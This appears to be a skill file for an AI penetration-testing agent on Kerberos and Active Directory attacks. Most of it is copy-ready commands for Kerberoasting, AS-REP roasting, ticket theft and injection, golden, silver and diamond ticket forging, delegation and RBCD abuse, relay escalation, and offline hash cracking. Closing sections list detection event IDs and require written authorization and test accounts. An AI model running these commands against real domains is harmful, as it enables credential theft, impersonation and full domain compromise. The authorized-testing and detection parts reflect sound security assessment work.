---
name: kerberos-attacks
description: "Assess Kerberos authentication and delegation weaknesses in an explicitly authorized AD lab or engagement"
category: identity-security
author: cyberstrike-official
tags: [kerberos, ad, windows, tickets, delegation, authentication]
tech_stack: [active-directory, kerberos, windows]
chains_with: [ad-security, windows-postexploit]
prerequisites: [ad-security]
version: "1.2.0"
---

# Kerberos Attack Techniques

## Kerberos Authentication Flow

```
Client                    KDC (DC)                   Service
   │                         │                          │
   │──AS-REQ (username)─────>│                          │
   │<─AS-REP (TGT)───────────│                          │
   │                         │                          │
   │──TGS-REQ (TGT, SPN)────>│                          │
   │<─TGS-REP (TGS)──────────│                          │
   │                         │                          │
   │──AP-REQ (TGS)──────────────────────────────────────>│
   │<─AP-REP────────────────────────────────────────────│
```

## Attack Categories

### 1. Kerberoasting

Request TGS tickets for service accounts and crack offline.

```bash
# Impacket - GetUserSPNs
GetUserSPNs.py domain.local/user:pass -dc-ip 10.0.0.1 -request

# Rubeus (Windows)
Rubeus.exe kerberoast /outfile:hashes.txt

# NetExec
nxc ldap 10.0.0.1 -u user -p pass --kerberoasting kerberoast.txt

# Targeting specific user
GetUserSPNs.py domain.local/user:pass -dc-ip 10.0.0.1 -request-user svc_sql
```

**Crack Hashes:**

```bash
# Hashcat
hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule

# John
john --format=krb5tgs hashes.txt --wordlist=wordlist.txt
```

### 2. AS-REP Roasting

Attack accounts with "Do not require Kerberos preauthentication" enabled.

```bash
# Find vulnerable users
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.0.0.1 -format hashcat

# With credentials (query LDAP)
GetNPUsers.py domain.local/user:pass -dc-ip 10.0.0.1 -request

# Rubeus (Windows)
Rubeus.exe asreproast /outfile:asrep.txt

# NetExec
nxc ldap 10.0.0.1 -u user -p pass --asreproast asrep.txt
```

**Crack Hashes:**

```bash
# Hashcat
hashcat -m 18200 asrep.txt wordlist.txt -r rules/best64.rule
```

### 3. Pass-the-Ticket (PtT)

Inject stolen Kerberos tickets into session.

```bash
# Export tickets (Mimikatz)
sekurlsa::tickets /export

# Inject ticket (Mimikatz)
kerberos::ptt ticket.kirbi

# Rubeus inject
Rubeus.exe ptt /ticket:base64_ticket

# Linux - export ticket
export KRB5CCNAME=/path/to/ticket.ccache

# Convert kirbi to ccache
ticketConverter.py ticket.kirbi ticket.ccache
```

### 4. Overpass-the-Hash (Pass-the-Key)

Request TGT using NTLM hash instead of password.

```bash
# Rubeus
Rubeus.exe asktgt /user:admin /rc4:NTLM_HASH /ptt

# Impacket
getTGT.py domain.local/admin -hashes :NTLM_HASH

# With AES key
getTGT.py domain.local/admin -aesKey AES_KEY
```

### 5. Golden Ticket

Forge TGT using KRBTGT hash (requires domain compromise).

```bash
# Get KRBTGT hash (DCSync)
secretsdump.py domain.local/admin@10.0.0.1 -just-dc-user krbtgt

# Create Golden Ticket (Mimikatz)
kerberos::golden /user:fakeadmin /domain:domain.local \
  /sid:S-1-5-21-DOMAIN-SID /krbtgt:KRBTGT_HASH /ptt

# Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-DOMAIN-SID \
  -domain domain.local fakeadmin

# Use ticket
export KRB5CCNAME=fakeadmin.ccache
psexec.py domain.local/fakeadmin@dc01 -k -no-pass
```

### 6. Silver Ticket

Forge TGS for specific service using service account hash.

```bash
# Get service account hash
secretsdump.py domain.local/admin@10.0.0.1 -just-dc-user svc_sql$

# Create Silver Ticket for CIFS (Mimikatz)
kerberos::golden /user:fakeadmin /domain:domain.local \
  /sid:S-1-5-21-DOMAIN-SID /target:server.domain.local \
  /service:cifs /rc4:SERVICE_NTLM /ptt

# Impacket - Silver ticket for MSSQL
ticketer.py -nthash SERVICE_NTLM -domain-sid S-1-5-21-DOMAIN-SID \
  -domain domain.local -spn MSSQLSvc/sql01.domain.local:1433 admin
```

**Common Service SPNs:**
| Service | SPN |
|---------|-----|
| SMB/CIFS | cifs/hostname |
| MSSQL | MSSQLSvc/hostname:1433 |
| HTTP | http/hostname |
| LDAP | ldap/hostname |
| HOST | host/hostname |

### 7. Diamond Ticket

Modify legitimate TGT (harder to detect than Golden Ticket).

```bash
# Rubeus (requires KRBTGT AES key)
Rubeus.exe diamond /krbkey:AES256_KEY /user:user /password:pass \
  /enctype:aes /ticketuser:fakeadmin /ticketuserid:500 /groups:512 /ptt
```

### 8. Delegation Attacks

#### Unconstrained Delegation

```bash
# Find unconstrained delegation computers
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# Coerce authentication (PrinterBug)
SpoolSample.exe dc01.domain.local attacker.domain.local

# Capture and use TGT
Rubeus.exe monitor /interval:1
Rubeus.exe ptt /ticket:base64_tgt
```

#### Constrained Delegation

```bash
# S4U2Self + S4U2Proxy
getST.py -spn cifs/target.domain.local domain.local/svc_constrained:pass \
  -impersonate administrator

# Rubeus
Rubeus.exe s4u /user:svc_constrained /rc4:HASH \
  /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

#### Resource-Based Constrained Delegation (RBCD)

```bash
# Add computer account
addcomputer.py domain.local/user:pass -method LDAPS -computer-name FAKE$ -computer-pass Pass123

# Set msDS-AllowedToActOnBehalfOfOtherIdentity
rbcd.py -delegate-to TARGET$ -delegate-from FAKE$ -dc-ip 10.0.0.1 domain.local/user:pass

# Get ticket
getST.py -spn cifs/target.domain.local domain.local/FAKE$:Pass123 -impersonate administrator

# Use ticket
export KRB5CCNAME=administrator.ccache
smbexec.py domain.local/administrator@target.domain.local -k -no-pass
```

### 9. Kerberos Relay

Relay Kerberos authentication (KrbRelayUp, KrbRelay).

```bash
# KrbRelayUp (local privilege escalation)
KrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount \
  -ComputerName YOURCOMPUTER$ -ComputerPassword Password123

# Then use RBCD to escalate
```

## Encryption Types

| etype     | Algorithm  | Strength         |
| --------- | ---------- | ---------------- |
| 0x17 (23) | RC4-HMAC   | Weak (NTLM hash) |
| 0x11 (17) | AES128-CTS | Strong           |
| 0x12 (18) | AES256-CTS | Strongest        |

## Ticket Fields

| Field      | Description            |
| ---------- | ---------------------- |
| cname      | Client principal name  |
| crealm     | Client realm           |
| sname      | Service principal name |
| srealm     | Service realm          |
| enc-part   | Encrypted ticket data  |
| authtime   | Authentication time    |
| starttime  | Ticket valid from      |
| endtime    | Ticket expires         |
| renew-till | Renewal expiration     |

## Detection Indicators

| Attack            | Event ID | Indicator                  |
| ----------------- | -------- | -------------------------- |
| Kerberoasting     | 4769     | RC4 ticket requests        |
| AS-REP Roast      | 4768     | Pre-auth disabled accounts |
| Golden Ticket     | 4769     | Non-existent users         |
| Silver Ticket     | N/A      | Direct service access      |
| Overpass-the-Hash | 4768     | NTLM in AS-REQ             |
| DCSync            | 4662     | DS-Replication-Get-Changes |

## Authorization and Verification Gate

**Scope gate:** Confirm the domain, domain controllers, account set, allowed techniques, and test window in writing. The examples below are for a lab or explicitly authorized engagement only; do not run them against a third-party domain without permission.

**Evidence gate:** Prefer read-only discovery and test accounts. A Kerberoastable SPN, disabled pre-authentication, RC4 ticket, or delegation flag is a configuration signal, not proof that an account is compromised. Demonstrate only the minimum permitted impact and document the exact boundary crossed.


- Perform Kerberos assessment only in an explicitly authorized domain or lab, with the permitted account set and test window confirmed.
- Start with read-only domain and SPN discovery. An SPN, delegation flag, encryption type, or ticket request is a lead; verify the effective trust/permission boundary before reporting.
- Do not export or reuse real tickets, dump password material, crack real user credentials, or access unrelated users' resources unless the engagement explicitly authorizes that activity. Prefer designated test accounts and approved test datasets.
- For delegation or impersonation findings, demonstrate the exact permission edge using a controlled account. Do not create persistence or change directory permissions to prove a theoretical path.
- Record sanitized configuration, account role, timestamp, and expected/observed behavior. Keep ticket material, hashes, and real usernames out of the skill library.

## Kerberos Test Coverage and Evidence Matrix

Separate protocol/configuration indicators from demonstrated security impact. Start with read-only domain and SPN discovery and use only designated test principals.

| Area | Review | Evidence threshold |
|---|---|---|
| SPN/service accounts | service ownership and password policy context | configuration plus approved test-account validation |
| Kerberoasting exposure | encryption types and service-account controls | authorized test dataset; no real ticket/hash export |
| AS-REP behavior | pre-authentication settings | controlled test account and sanitized directory evidence |
| Delegation | constrained/unconstrained/resource-based delegation | exact permission path with test principals |
| Ticket lifetime/revocation | policy and behavior after session/account changes | reproducible behavior using a test identity |
| Detection | relevant event IDs and expected telemetry | sanitized event evidence without collecting unrelated logs |

A requested service ticket, SPN, or delegation flag alone is not proof of compromise. Do not crack, reuse, export, or store real users' password material or tickets; do not access unrelated users' data. Document the account role, relevant configuration, authorized test, timestamps, and practical impact.
